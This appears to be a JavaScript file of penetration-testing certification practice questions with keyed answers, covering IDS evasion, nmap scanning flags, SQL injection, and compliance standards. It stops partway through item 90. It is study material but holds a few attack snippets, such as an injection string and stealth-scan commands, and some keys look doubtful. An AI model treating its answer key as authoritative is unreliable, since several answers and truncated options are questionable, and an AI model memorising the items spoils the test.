const quizQuestions = [
  {
    "id": 1,
    "question": "Session splicing is an IDS evasion technique that exploits how some IDSs do not reconstruct sessions before performing pattern matching on the data. The idea behind session splicing is to split data between several packets, ensuring that no single packet matches any patterns within an IDS signature. Which tool can be used to perform session splicing attacks?",
    "answers": [
      "tcpsplice",
      "Burp",
      "Hydra",
      "Whisker"
    ],
    "correct": "Whisker"
  },
  {
    "id": 2,
    "question": "Which of the following characteristics is not true about the Simple Object Access Protocol?",
    "answers": [
      "Exchanges data between web services.",
      "Only compatible with the application protocol HTTP.",
      "Allows for any programming model.",
      "Using Extensible Markup Language."
    ],
    "correct": "Only compatible with the application protocol HTTP."
  },
  {
    "id": 3,
    "question": "According to the Payment Card Industry Data Security Standard, when is it necessary to conduct external and internal penetration testing?",
    "answers": [
      "At least once a year and after any significant upgrade or modification.",
      "At least once every two years and after any significant upgrade or modification.",
      "At least once every three years or after any significant upgrade or modification.",
      "At least twice a year or after any significant upgrade or modification."
    ],
    "correct": "At least once a year and after any significant upgrade or modification."
  },
  {
    "id": 4,
    "question": "Alex, the penetration tester, performs a server scan. To do this, he uses the method where the TCP Header is split into many packets so that it becomes difficult to determine what packages are used for. Determine the scanning technique that Alex uses?",
    "answers": [
      "Inverse TCP flag scanning",
      "IP Fragmentation Scan",
      "TCP Scanning",
      "ACK flag scanning"
    ],
    "correct": "IP Fragmentation Scan"
  },
  {
    "id": 5,
    "question": "The evil hacker Antonio is trying to attack the IoT device. He will use several fake identities to create a strong illusion of traffic congestion, affecting communication between neighbouring nodes and networks. What kind of attack does Antonio perform?",
    "answers": [
      "Sybil Attack",
      "Exploit Kits",
      "Forged Malicious Device",
      "Side-Channel Attack"
    ],
    "correct": "Sybil Attack"
  },
  {
    "id": 6,
    "question": "Which of the following wireless standard has bandwidth up to 54 Mbit/s and signals in a regulated frequency spectrum around 5 GHz?",
    "answers": [
      "802.11i",
      "802.11n",
      "802.11a",
      "802.11g"
    ],
    "correct": "802.11a"
  },
  {
    "id": 7,
    "question": "Attacker uses various IDS evasion techniques to bypass intrusion detection mechanisms. At the same time, IDS is configured to detect possible violations of the security policy, including unauthorized access and misuse. Which of the following evasion method depend on the Time-to-Live (TTL) fields of a TCP/IP ?",
    "answers": [
      "Denial-of-Service Attack",
      "Unicode Evasion",
      "Insertion Attack",
      "Obfuscation"
    ],
    "correct": "Insertion Attack"
  },
  {
    "id": 8,
    "question": "Which of the following is the method of determining the movement of a data packet from an untrusted external host to a protected internal host through a firewall?",
    "answers": [
      "Session hijacking",
      "Network sniffing",
      "Firewalking",
      "MITM"
    ],
    "correct": "Firewalking"
  },
  {
    "id": 9,
    "question": "Often, for a successful attack, hackers very skillfully simulate phishing messages. To do this, they collect the maximum information about the company that they will attack: emails of real employees (including information about the hierarchy in the company), information about the appearance of the message (formatting, logos), etc. What is the name of this stage of the hacker's work?",
    "answers": [
      "Investigation stage",
      "Enumeration stage",
      "Reconnaissance stage",
      "Exploration stage"
    ],
    "correct": "Reconnaissance stage"
  },
  {
    "id": 10,
    "question": "Identify Secure Hashing Algorithm, which produces a 160-bit digest from a message on principles similar to those used in MD4 and MD5?",
    "answers": [
      "SHA-1",
      "SHA-3",
      "SHA-0",
      "SHA-2"
    ],
    "correct": "SHA-1"
  },
  {
    "id": 11,
    "question": "Which of the following Nmap's commands allows you to most reduce the probability of detection by IDS when scanning common ports?",
    "answers": [
      "nmap -A - Pn",
      "nmap -A --host-timeout 99-T1",
      "nmap -sT -O -T0",
      "nmap -sT -O -T2"
    ],
    "correct": "nmap -sT -O -T0"
  },
  {
    "id": 12,
    "question": "What is a set of extensions to DNS that provide to DNS clients (resolvers) origin authentication, authenticated denial of existence and data integrity, but not availability or confidentiality?",
    "answers": [
      "Resource records",
      "DNSSEC",
      "Resource transfer",
      "Zone transfer"
    ],
    "correct": "DNSSEC"
  },
  {
    "id": 13,
    "question": "Which of the following web application attack inject the special character elements \"Carriage Return\" and \"Line Feed\" into the user\u2019s input to trick the web server, web application, or user into believing that the current object is terminated and a new object has been initiated?",
    "answers": [
      "Server-Side JS Injection.",
      "Log Injection.",
      "CRLF Injection.",
      "HTML Injection."
    ],
    "correct": "CRLF Injection."
  },
  {
    "id": 14,
    "question": "Elon plans to make it difficult for the packet filter to determine the purpose of the packet when scanning. Which of the following scanning techniques will Elon use?",
    "answers": [
      "ICMP scanning.",
      "ACK scanning.",
      "IPID scanning.",
      "SYN/FIN scanning using IP fragments."
    ],
    "correct": "SYN/FIN scanning using IP fragments."
  },
  {
    "id": 15,
    "question": "You analyze the logs and see the following output of logs from the machine with the IP address of 192.168.0.132:\n\nTime August 21 11:22:06 Port:20 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP\n\nTime August 21 11:22:08 Port:21 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP  \n\nTime August 21 11:22:11 Port:22 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP  \n\nTime August 21 11:22:14 Port:23 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP  \n\nTime August 21 11:22:15 Port:25 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP  \n\nTime August 21 11:22:19 Port:80 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP  \n\nTime August 21 11:22:21 Port:443 Source:192.168.0.30 Destination:192.168.0.132 Protocol:TCP\n\nWhat conclusion can you make based on this output?",
    "answers": [
      "Port scan targeting 192.168.0.132",
      "Port scan targeting 192.168.0.30",
      "Teardrop attack targeting 192.168.0.132",
      "Denial of service attack targeting 192.168.0.132"
    ],
    "correct": "Port scan targeting 192.168.0.132"
  },
  {
    "id": 16,
    "question": "Michael works as a system administrator. He receives a message that several sites are no longer available. Michael tried to go to the sites by URL, but it didn't work. Then he tried to ping the sites and enter IP addresses in the browser - it worked. What problem could Michael identify?",
    "answers": [
      "Traffic is Blocked on UDP Port 56",
      "Traffic is Blocked on UDP Port 53",
      "Traffic is Blocked on UDP Port 69",
      "Traffic is Blocked on UDP Port 88"
    ],
    "correct": "Traffic is Blocked on UDP Port 53"
  },
  {
    "id": 17,
    "question": "Which of the following options represents a conceptual characteristic of an anomaly- based IDS over a signature-based IDS?",
    "answers": [
      "Requires vendor updates for a new threat.",
      "Can identify unknown attacks.",
      "Cannot deal with encrypted network traffic.",
      "Produces less false positives."
    ],
    "correct": "Can identify unknown attacks."
  },
  {
    "id": 18,
    "question": "Which of the following command will help you launch the Computer Management Console from\" Run \" windows as a local administrator Windows 7?",
    "answers": [
      "ncpa.cpl",
      "compmgmt.msc",
      "services.msc",
      "gpedit.msc"
    ],
    "correct": "compmgmt.msc"
  },
  {
    "id": 19,
    "question": "Victor, a white hacker, received an order to perform a penetration test from the company \"Test us\". He starts collecting information and finds the email of an employee of this company in free access. Victor decides to send a letter to this email, changing the original email address to the email of the boss of this employee, \"boss@testus.com\". He asks the employee to immediately open the \"link with the report\" and check it. An employee of the company \"Test us\" opens this link and infects his computer. Thanks to these manipulations, Viktor gained access to the corporate network and successfully conducted a pentest. What type of attack did Victor use?",
    "answers": [
      "Eavesdropping",
      "Social engineering",
      "Tailgating",
      "Piggybacking"
    ],
    "correct": "Social engineering"
  },
  {
    "id": 20,
    "question": "Identify the standard by the description: A regulation contains a set of guidelines that everyone who processes any electronic data in medicine should adhere to. It includes information on medical practices, ensuring that all necessary measures are in place while saving, accessing, and sharing any electronic medical data to secure patient data.",
    "answers": [
      "COBIT",
      "ISO/IEC 27002",
      "HIPAA",
      "FISMA"
    ],
    "correct": "HIPAA"
  },
  {
    "id": 21,
    "question": "Which of the following command-line flags set a stealth scan for Nmap?",
    "answers": [
      "-sT",
      "-sS",
      "-sM",
      "-sU"
    ],
    "correct": "-sS"
  },
  {
    "id": 22,
    "question": "What best describes two-factor authentication for a credit card (using a card and pin)?",
    "answers": [
      "Something you have and something you know.",
      "Something you know and something you are.",
      "Something you have and something you are.",
      "Something you are and something you remember."
    ],
    "correct": "Something you have and something you know."
  },
  {
    "id": 23,
    "question": "While using your bank's online servicing you notice the following string in the URL bar: http://www.MyPersonalBank.com/account?id=368940911028389&Damount=10980&C amount=21 You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflect the changes. Which type of vulnerability is present on this site?",
    "answers": [
      "Web Parameter Tampering",
      "XSS Reflection",
      "SQL injection",
      "Cookie Tampering"
    ],
    "correct": "Web Parameter Tampering"
  },
  {
    "id": 24,
    "question": "Which regulation defines security and privacy controls for all U.S. federal information systems except those related to national security?",
    "answers": [
      "NIST-800-53",
      "PCI-DSS",
      "EU Safe Harbor",
      "HIPAA"
    ],
    "correct": "NIST-800-53"
  },
  {
    "id": 25,
    "question": "After several unsuccessful attempts to extract cryptography keys using software methods, Mark is thinking about trying another code-breaking methodology. Which of the following will best suit Mark based on his unsuccessful attempts?",
    "answers": [
      "One-Time Pad.",
      "Trickery and Deceit.",
      "Frequency Analysis.",
      "Brute-Force."
    ],
    "correct": "Trickery and Deceit."
  },
  {
    "id": 26,
    "question": "Which of the following can be designated as \"Wireshark for CLI\"?",
    "answers": [
      "John the Ripper",
      "tcpdump",
      "nessus",
      "ethereal"
    ],
    "correct": "tcpdump"
  },
  {
    "id": 27,
    "question": "Which of the following methods is best suited to protect confidential information on your laptop which can be stolen while travelling?",
    "answers": [
      "BIOS password.",
      "Full disk encryption.",
      "Password protected files.",
      "Hidden folders."
    ],
    "correct": "Full disk encryption."
  },
  {
    "id": 28,
    "question": "Rajesh, the system administrator analyzed the IDS logs and noticed that when accessing the external router from the administrator's computer to update the router configuration, IDS registered alerts. What type of an alert is this?",
    "answers": [
      "True negative",
      "False negative",
      "True positve",
      "False positive"
    ],
    "correct": "False positive"
  },
  {
    "id": 29,
    "question": "Identify the type of jailbreaking which allows user-level access and does not allow iboot- level access?",
    "answers": [
      "Userland Exploit",
      "iBoot Exploit",
      "Bootrom Exploit",
      "iBootrom Exploit"
    ],
    "correct": "Userland Exploit"
  },
  {
    "id": 30,
    "question": "You makes a series of interactive queries, choosing subsequent plaintexts based on the information from the previous encryptions. What type of attack are you trying to perform?",
    "answers": [
      "Chosen-plaintext attack",
      "Known-plaintext attack",
      "Ciphertext-only attack",
      "Adaptive chosen-plaintext attack"
    ],
    "correct": "Adaptive chosen-plaintext attack"
  },
  {
    "id": 31,
    "question": "Which of the following is the type of violation when an unauthorized individual enters a building following an employee through the employee entrance?",
    "answers": [
      "Pretexting.",
      "Announced.",
      "Reverse Social Engineering.",
      "Tailgating."
    ],
    "correct": "Tailgating."
  },
  {
    "id": 32,
    "question": "alert tcp any any -> 10.199.10.3 21 (msg: \"FTP on the network!\";) Which system usually uses such a configuration setting?",
    "answers": [
      "FTP Server rule",
      "IDS",
      "Router IPTable",
      "Firewall IPTable"
    ],
    "correct": "IDS"
  },
  {
    "id": 33,
    "question": "With which of the following SQL injection attacks can an attacker deface a web page, modify or add data stored in a database and compromised data integrity?",
    "answers": [
      "Compromised Data Integrity.",
      "Loss of data availability.",
      "Unauthorized access to an application.",
      "Information Disclosure."
    ],
    "correct": "Compromised Data Integrity."
  },
  {
    "id": 34,
    "question": "How works the mechanism of a Boot Sector Virus?",
    "answers": [
      "Overwrites the original MBR and only executes the new virus code.",
      "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
      "Moves the MBR to another location on the Random-access memory and copies itself to the original location of the MBR.",
      "Modifies directory table entries to point to the virus code instead of the actual MBR."
    ],
    "correct": "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR."
  },
  {
    "id": 35,
    "question": "Which of the following tools is packet sniffer, network detector and IDS for 802.11(a, b, g, n) wireless LANs?",
    "answers": [
      "Nmap",
      "Nessus",
      "Abel",
      "Kismet"
    ],
    "correct": "Kismet"
  },
  {
    "id": 36,
    "question": "You know that the application you are attacking is vulnerable to an SQL injection, but you cannot see the result of the injection. You send a SQL query to the database, which makes the database wait before it can react. You can see from the time the database takes to respond, whether a query is true or false. What type of SQL injection did you use?",
    "answers": [
      "Error-based SQLi.",
      "UNION SQLi.",
      "Blind SQLi.",
      "Out-of-band SQLi."
    ],
    "correct": "Blind SQLi."
  },
  {
    "id": 37,
    "question": "Philip, a cybersecurity specialist, needs a tool that can function as a network sniffer, record network activity, prevent and detect network intrusion. Which of the following tools is suitable for Philip?",
    "answers": [
      "Nmap",
      "Nessus",
      "Snort",
      "Cain & Abel"
    ],
    "correct": "Snort"
  },
  {
    "id": 38,
    "question": "Mark, the network administrator, must allow UDP traffic on the host 10.0.0.3 and Internet traffic in the host 10.0.0.2. In addition to the main task, he needs to allow all FTP traffic to the rest of the network and deny all other traffic. Mark applies his ACL configuration on the router, and everyone has a problem with accessing FTP. In addition, hosts that are allowed access to the Internet cannot connect to it. In accordance with the following configuration, determine what happened on the network?  \naccess-list 102 deny tcp any any  \naccess-list 104 permit udp host 10.0.0.3 any  \naccess-list 110 permit tcp host 10.0.0.2 eq www any  \naccess-list 108 permit tcp any eq ftp any",
    "answers": [
      "The ACL 110 needs to be changed to port 80.",
      "The first ACL is denying all TCP traffic, and the router is ignoring the other",
      "The ACL 104 needs to be first because is UDP.",
      "The ACL for FTP must be before the ACL 110."
    ],
    "correct": "The first ACL is denying all TCP traffic, and the router is ignoring the other"
  },
  {
    "id": 39,
    "question": "Which one of the following Google search operators allows restricting results to those from a specific website?",
    "answers": [
      "[cache:]",
      "[site:]",
      "[inurl:]",
      "[link:]"
    ],
    "correct": "[site:]"
  },
  {
    "id": 40,
    "question": "John needs to choose a firewall that can protect against SQL injection attacks. Which of the following types of firewalls is suitable for this task?",
    "answers": [
      "Web application firewall.",
      "Stateful firewall.",
      "Packet firewall.",
      "Hardware firewall."
    ],
    "correct": "Web application firewall."
  },
  {
    "id": 41,
    "question": "You managed to compromise a server with an IP address of 10.10.0.5, and you want to get fast a list of all the machines in this network. Which of the following Nmap command will you need?",
    "answers": [
      "nmap -T4 -r 10.10.1.0/24",
      "nmap -T4 -q 10.10.0.0/24",
      "nmap -T4 -p 10.10.0.0/24",
      "nmap -T4 -F 10.10.0.0/24"
    ],
    "correct": "nmap -T4 -F 10.10.0.0/24"
  },
  {
    "id": 42,
    "question": "Maria conducted a successful attack and gained access to a Linux server. She wants to avoid that NIDS will not catch the succeeding outgoing traffic from this server in the future. Which of the following is the best way to avoid detection of NIDS?",
    "answers": [
      "Alternate Data Streams.",
      "Protocol Isolation.",
      "Encryption.",
      "Out of band signaling."
    ],
    "correct": "Encryption."
  },
  {
    "id": 43,
    "question": "Black hat hacker Ivan wants to implement a man-in-the-middle attack on the corporate network. For this, he connects his router to the network and redirects traffic to intercept packets. What can the administrator do to mitigate the attack?",
    "answers": [
      "Add message authentication to the routing protocol.",
      "Use only static routes in the corporation's network.",
      "Redirection of the traffic is not possible without the explicit admin's",
      "Use the Open Shortest Path First (OSPF)."
    ],
    "correct": "Add message authentication to the routing protocol."
  },
  {
    "id": 44,
    "question": "Rajesh, a system administrator, noticed that some clients of his company were victims of DNS Cache Poisoning. They were redirected to a malicious site when they tried to access Rajesh's company site. What is the best recommendation to deal with such a threat?",
    "answers": [
      "Use Domain Name System Security Extensions (DNSSEC)",
      "Use a multi-factor authentication",
      "Use of security agents on customers' computers.",
      "Customer awareness"
    ],
    "correct": "Use Domain Name System Security Extensions (DNSSEC)"
  },
  {
    "id": 45,
    "question": "Which of the following best describes code injection?",
    "answers": [
      "Form of attack in which a malicious user gains access to the codebase on the server and inserts new code.",
      "Form of attack in which a malicious user gets the server to execute arbitrary code using a buffer overflow.",
      "Form of attack in which a malicious user inserts text into a data field interpreted as code.",
      "Form of attack in which a malicious user inserts additional code into the JavaScript running in the browser."
    ],
    "correct": "Form of attack in which a malicious user inserts text into a data field interpreted as code."
  },
  {
    "id": 46,
    "question": "The attacker tries to take advantage of vulnerability where the application does not verify if the user is authorized to access the internal object via its name or key. Which of the following queries best describes an attempt to exploit an insecure direct object using the name of the valid account \"User 1\"?",
    "answers": [
      "\"GET/restricted/bank.getaccount(\"\u02dcUser1') HTTP/1.1 Host: westbank.com\"",
      "\"GET/restricted/accounts/?name=User1 HTTP/1.1 Host: westbank.com\"",
      "\"GET/restricted/goldtransfer?to=Account&from=1 or 1=1' HTTP/1.1Host:",
      "\"GET/restricted/\\r\\n\\%00account%00User1%00access HTTP/1.1 Host:"
    ],
    "correct": "\"GET/restricted/accounts/?name=User1 HTTP/1.1 Host: westbank.com\""
  },
  {
    "id": 47,
    "question": "Which of the following incident handling process phases is responsible for defining rules, employees training, creating a back-up, and preparing software and hardware resources before an incident occurs?",
    "answers": [
      "Containment",
      "Identification",
      "Recovery",
      "Preparation"
    ],
    "correct": "Preparation"
  },
  {
    "id": 48,
    "question": "Which of the following is a network software suite designed for 802.11 WEP and WPA- PSK keys cracking that can recover keys once enough data packets have been captured?",
    "answers": [
      "wificracker",
      "Aircrack-ng",
      "Airguard",
      "WLAN-crack"
    ],
    "correct": "Aircrack-ng"
  },
  {
    "id": 49,
    "question": "Which of the options presented below is not a Bluetooth attack?",
    "answers": [
      "Bluesmacking",
      "Bluesnarfing",
      "Bluejacking",
      "Bluedriving"
    ],
    "correct": "Bluedriving"
  },
  {
    "id": 50,
    "question": "Why is a penetration test considered to be better than a vulnerability scan?",
    "answers": [
      "A penetration test is often performed by an automated tool, while a vulnerability",
      "Penetration tests are intended to exploit weaknesses in the architecture of your",
      "The tools used by penetration testers tend to have much more comprehensive",
      "Vulnerability scans only do host discovery and port scanning by default."
    ],
    "correct": "Penetration tests are intended to exploit weaknesses in the architecture of your"
  },
  {
    "id": 51,
    "question": "The company \"Usual company\" asked a cybersecurity specialist to check their perimeter email gateway security. To do this, the specialist creates a specially formatted email message:  From: employee76@usualcompany.com  To: employee34@usualcompany.com  Subject: Test message  Date: 5/8/2021 11:22 He sends this message over the Internet, and a \"Usual company \" employee receives it. This means that the gateway of this company doesn't prevent _____.",
    "answers": [
      "Email Spoofing",
      "Email Harvesting",
      "Email Masquerading",
      "Email Phishing"
    ],
    "correct": "Email Spoofing"
  },
  {
    "id": 52,
    "question": "Which of the following tools is a command-line vulnerability scanner that scans web servers for dangerous files/CGIs?",
    "answers": [
      "Snort",
      "John the Ripper",
      "Kon-Boot",
      "Nikto"
    ],
    "correct": "Nikto"
  },
  {
    "id": 53,
    "question": "You conduct an investigation and finds out that the browser of one of your employees sent malicious requests that the employee knew nothing about. Identify the web page vulnerability that the attacker used when the attack to your employee?",
    "answers": [
      "Command Injection Attacks",
      "File Inclusion Attack",
      "Cross-Site Request Forgery (CSRF)",
      "Hidden Field Manipulation Attack"
    ],
    "correct": "Cross-Site Request Forgery (CSRF)"
  },
  {
    "id": 54,
    "question": "Which of the following will allow you to prevent unauthorized network access to local area networks and other information assets by wireless devices?",
    "answers": [
      "AISS",
      "WIPS",
      "HIDS",
      "NIDS"
    ],
    "correct": "WIPS"
  },
  {
    "id": 55,
    "question": "Andrew is conducting a penetration test. He is now embarking on sniffing the target network. What is not available for Andrew when sniffing the network?",
    "answers": [
      "Modifying and replaying captured network traffic.",
      "Collecting unencrypted information about usernames and passwords.",
      "Capturing network traffic for further analysis.",
      "Identifying operating systems, services, protocols and devices."
    ],
    "correct": "Modifying and replaying captured network traffic."
  },
  {
    "id": 56,
    "question": "John, a pentester, received an order to conduct an internal audit in the company. One of its tasks is to search for open ports on servers. Which of the following methods is the best solution for this task?",
    "answers": [
      "Manual scan on each server.",
      "Telnet to every port on each server.",
      "Scan servers with Nmap.",
      "Scan servers with MBSA."
    ],
    "correct": "Scan servers with Nmap."
  },
  {
    "id": 57,
    "question": "What actions should be performed before using a Vulnerability Scanner for scanning a network?",
    "answers": [
      "Firewall detection.",
      "TCP/UDP Port scanning.",
      "Checking if the remote host is alive.",
      "TCP/IP stack fingerprinting."
    ],
    "correct": "Checking if the remote host is alive."
  },
  {
    "id": 58,
    "question": "Alex, a cyber security specialist, should conduct a pentest inside the network, while he received absolutely no information about the attacked network. What type of testing will Alex conduct?",
    "answers": [
      "Internal, Grey-box.",
      "External, Black-box.",
      "Internal, Black-box.",
      "Internal, White-box."
    ],
    "correct": "Internal, Black-box."
  },
  {
    "id": 59,
    "question": "Which of the following best describes a software firewall?",
    "answers": [
      "Software firewall is placed between the desktop and the software components",
      "Software firewall is placed between the anti-virus application and the IDS",
      "Software firewall is placed between the router and the networking components",
      "Software firewall is placed between the normal application and the networking"
    ],
    "correct": "Software firewall is placed between the normal application and the networking"
  },
  {
    "id": 60,
    "question": "Josh, a security analyst, wants to choose a tool for himself to examine links between data. One of the main requirements is to present data using graphs and link analysis. Which of the following tools will meet John's requirements?",
    "answers": [
      "Maltego.",
      "Metasploit.",
      "Analyst's Notebook.",
      "Palantir."
    ],
    "correct": "Maltego."
  },
  {
    "id": 61,
    "question": "Determine the type of SQL injection: SELECT * FROM user WHERE name = 'x' AND userid IS NULL; --';",
    "answers": [
      "End of Line Comment.",
      "Illegal/Logically Incorrect Query.",
      "UNION SQL Injection.",
      "Tautology."
    ],
    "correct": "End of Line Comment."
  },
  {
    "id": 62,
    "question": "You are configuring the connection of a new employee's laptop to join an 802.11 network. The new laptop has the same hardware and software as the laptops of other employees. You used the wireless packet sniffer and found that it shows that the Wireless Access Point (WAR) is not responding to the association requests being sent by the laptop. What can cause this problem?",
    "answers": [
      "The laptop is not configured to use DHCP.",
      "The laptop cannot see the SSID of the wireless network.",
      "The laptop is configured for the wrong channel.",
      "The WAP does not recognize the la[top's MAC address."
    ],
    "correct": "The WAP does not recognize the la[top's MAC address."
  },
  {
    "id": 63,
    "question": "The evil hacker Ivan has installed a remote access Trojan on a host. He wants to be sure that when a victim attempts to go to \"www.site.com\" that the user is directed to a phishing site. Which file should Ivan change in this case?",
    "answers": [
      "Hosts",
      "Boot.ini",
      "Networks",
      "Sudoers"
    ],
    "correct": "Hosts"
  },
  {
    "id": 64,
    "question": "Let's assume that you decided to use PKI to protect the email you will send. At what layer of the OSI model will this message be encrypted and decrypted?",
    "answers": [
      "Transport layer.",
      "Session layer.",
      "Application layer.",
      "Presentation layer."
    ],
    "correct": "Presentation layer."
  },
  {
    "id": 65,
    "question": "Rajesh, a network administrator found several unknown files in the root directory of his FTP server. He was very interested in a binary file named \"mfs\". Rajesh decided to check the FTP server logs and found that the anonymous user account logged in to the server, uploaded the files and ran the script using a function provided by the FTP server's software. Also, he found that \"mfs\" file is running as a process and it listening to a network port. What kind of vulnerability must exist to make this attack possible?",
    "answers": [
      "Privilege escalation.",
      "File system permissions.",
      "Brute force login.",
      "Directory traversal."
    ],
    "correct": "File system permissions."
  },
  {
    "id": 66,
    "question": "Which of the following UDP ports is usually used by Network Time Protocol (NTP)?",
    "answers": [
      "123",
      "19",
      "177",
      "161"
    ],
    "correct": "123"
  },
  {
    "id": 67,
    "question": "Which of the following best describes the \"white box testing\" methodology?",
    "answers": [
      "The internal operation of a system is only partly accessible to the tester.",
      "The internal operation of a system is completely known to the tester.",
      "Only the external operation of a system is accessible to the tester.",
      "Only the internal operation of a system is known to the tester."
    ],
    "correct": "The internal operation of a system is completely known to the tester."
  },
  {
    "id": 68,
    "question": "Which of the following requires establishing national standards for electronic health care transactions and national identifiers for providers, health insurance plans, and employers?",
    "answers": [
      "DMCA",
      "SOX",
      "HIPAA",
      "PCI-DSS"
    ],
    "correct": "HIPAA"
  },
  {
    "id": 69,
    "question": "Alex, a cybersecurity specialist, received a task from the head to scan open ports. One of the main conditions was to use the most reliable type of TCP scanning. Which of the following types of scanning should Alex use?",
    "answers": [
      "Half-open Scan.",
      "NULL Scan.",
      "TCP Connect/Full Open Scan.",
      "Xmas Scan."
    ],
    "correct": "TCP Connect/Full Open Scan."
  },
  {
    "id": 70,
    "question": "Viktor, the white hat hacker, conducts a security audit. He gains control over a user account and tries to access another account's sensitive information and files. How can he do this?",
    "answers": [
      "Port Scanning",
      "Fingerprinting",
      "Privilege Escalation",
      "Shoulder-Surfing"
    ],
    "correct": "Privilege Escalation"
  },
  {
    "id": 71,
    "question": "Which of the following is a protocol that used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system?",
    "answers": [
      "CAPTCHA",
      "WHOIS",
      "Internet Engineering Task Force",
      "Internet Assigned Numbers Authority"
    ],
    "correct": "WHOIS"
  },
  {
    "id": 72,
    "question": "John performs black-box testing. It tries to pass IRC traffic over port 80/TCP from a compromised web-enabled host during the test. Traffic is blocked, but outbound HTTP traffic does not meet any obstacles. What type of firewall checks outbound traffic?",
    "answers": [
      "Application",
      "Stateful",
      "Packet Filtering",
      "Circuit"
    ],
    "correct": "Application"
  },
  {
    "id": 73,
    "question": "Determine the attack according to the following scenario: Benjamin performs a cloud attack during the translation of the SOAP message in the TLS layer. He duplicates the body of the message and sends it to the server as a legitimate user. As a result of these actions, Benjamin managed to access the server resources to unauthorized access.",
    "answers": [
      "Wrapping",
      "Cloud Hopper",
      "Cloudborne",
      "Side-channel"
    ],
    "correct": "Wrapping"
  },
  {
    "id": 74,
    "question": "Which of the following does not apply to IPsec?",
    "answers": [
      "Encrypts the payloads",
      "Use key exchange.",
      "Provides authentication.",
      "Work at the Data Link Layer"
    ],
    "correct": "Work at the Data Link Layer"
  },
  {
    "id": 75,
    "question": "Imagine the following scenario: \n1. An attacker created a website with tempting content and benner like: 'Do you want to make $10 000 in a month?'. \n2. Victim clicks to the interesting and attractive content URL. \n3. Attacker creates a transparent 'iframe' in front of the banner which victim attempts to click. \nVictim thinks that he/she clicks to the 'Do you want to make $10 000 in a month?' banner but actually he/she clicks to the content or UPL that exists in the transparent 'iframe' which is set up by the attacker. \nWhat is the name of the attack which is described in the scenario?",
    "answers": [
      "Session Fixation",
      "HTML Injection",
      "Clickjacking Attack",
      "HTTP Parameter Pollution"
    ],
    "correct": "Clickjacking Attack"
  },
  {
    "id": 76,
    "question": "Maria is surfing the internet and try to find information about Super Security LLC. Which process is Maria doing?",
    "answers": [
      "Enumeration",
      "Footprinting",
      "Scanning",
      "System Hacking"
    ],
    "correct": "Footprinting"
  },
  {
    "id": 77,
    "question": "Which of the following application security testing method of white-box testing, in which only the source code of applications and their components is scanned for determines potential vulnerabilities in their software and architecture?",
    "answers": [
      "IAST",
      "SAST",
      "MAST",
      "DAST"
    ],
    "correct": "SAST"
  },
  {
    "id": 78,
    "question": "The firewall prevents packets from entering the organization through certain ports and applications. What does this firewall check?",
    "answers": [
      "Application layer port numbers and the transport layer headers.",
      "Presentation layer headers and the session layer port numbers.",
      "Network layer headers and the session layer port numbers.",
      "Application layer headers and transport layer port numbers."
    ],
    "correct": "Application layer headers and transport layer port numbers."
  },
  {
    "id": 79,
    "question": "What are the two main conditions for a digital signature?",
    "answers": [
      "Legible and neat.",
      "Unique and have special characters.",
      "It has to be the same number of characters as a physical signature and must be unique.",
      "Unforgeable and authentic."
    ],
    "correct": "Unforgeable and authentic."
  },
  {
    "id": 80,
    "question": "Which of the following is an encryption technique where data is encrypted by a sequence of photons that have a spinning trait while travelling from one end to another?",
    "answers": [
      "Elliptic Curve Cryptography.",
      "Homomorphic.",
      "Quantum Cryptography.",
      "Hardware-Based."
    ],
    "correct": "Quantum Cryptography."
  },
  {
    "id": 81,
    "question": "Wireshark is one of the most important tools for a cybersecurity specialist. It is used for network troubleshooting, analysis, software, etc. And you often have to work with a packet bytes pane. In what format is the data presented in this pane?",
    "answers": [
      "Binary",
      "Hexadecimal",
      "ASCII only",
      "Decimal"
    ],
    "correct": "Hexadecimal"
  },
  {
    "id": 82,
    "question": "John, a system administrator, is learning how to work with new technology: Docker. He will use it to create a network connection between the container interfaces and its parent host interface. Which of the following network drivers is suitable for John?",
    "answers": [
      "Overlay networking.",
      "Host networking.",
      "Bridge networking.",
      "Macvlan networking."
    ],
    "correct": "Macvlan networking."
  },
  {
    "id": 83,
    "question": "What identifies malware by collecting data from protected computers while analyzing it on the provider\u2019s infrastructure instead of locally?",
    "answers": [
      "Cloud-based detection",
      "Heuristics-based detection",
      "Behavioural-based detection",
      "Real-time protection"
    ],
    "correct": "Cloud-based detection"
  },
  {
    "id": 84,
    "question": "Jack sent an email to Jenny with a business proposal. Jenny accepted it and fulfilled all her obligations. Jack suddenly refused his offer when everything was ready and said that he had never sent an email. Which of the following digital signature properties will help Jenny prove that Jack is lying?",
    "answers": [
      "Confidentiality",
      "Authentication",
      "Non-Repudiation",
      "Integrity"
    ],
    "correct": "Non-Repudiation"
  },
  {
    "id": 85,
    "question": "Which of the following SQL injection attack does an attacker usually bypassing user authentication and extract data by using a conditional OR clause so that the condition of the WHERE clause will always be true?",
    "answers": [
      "Tautology",
      "UNION SQLi",
      "Error-Based SQLi",
      "End-of-Line Comment"
    ],
    "correct": "Tautology"
  },
  {
    "id": 86,
    "question": "Which of the following is a logical collection of Internet-connected devices such as computers, smartphones or Internet of things (IoT) devices whose security has been breached and control ceded to a third party?",
    "answers": [
      "Spambot",
      "Rootkit",
      "Botnet",
      "Spear Phishing"
    ],
    "correct": "Botnet"
  },
  {
    "id": 87,
    "question": "Which of the following is the risk that remains after the amount of risk left over after natural or inherent risks have been reduced?",
    "answers": [
      "Residual risk",
      "Impact risk",
      "Deferred risk",
      "Inherent risk"
    ],
    "correct": "Residual risk"
  },
  {
    "id": 88,
    "question": "What means the flag \"-oX\" in a Nmap scan?",
    "answers": [
      "Run a Xmas scan.",
      "Output the results in XML format to a file.",
      "Output the results in truncated format to the screen.",
      "Run an express scan."
    ],
    "correct": "Output the results in XML format to a file."
  },
  {
    "id": 89,
    "question": "Which of the following flags will trigger Xmas scan?",
    "answers": [
      "-sP",
      "-sX",
      "-sA",
      "-sV"
    ],
    "correct": "-sX"
  },
  {
    "id": 90,
    "question": "For the company, an important criterion is the immutability of the financial reports sent by the financial director to the accountant. They need to be sure that the accountant received the reports and it hasn't been changed. How can this be achieved?",
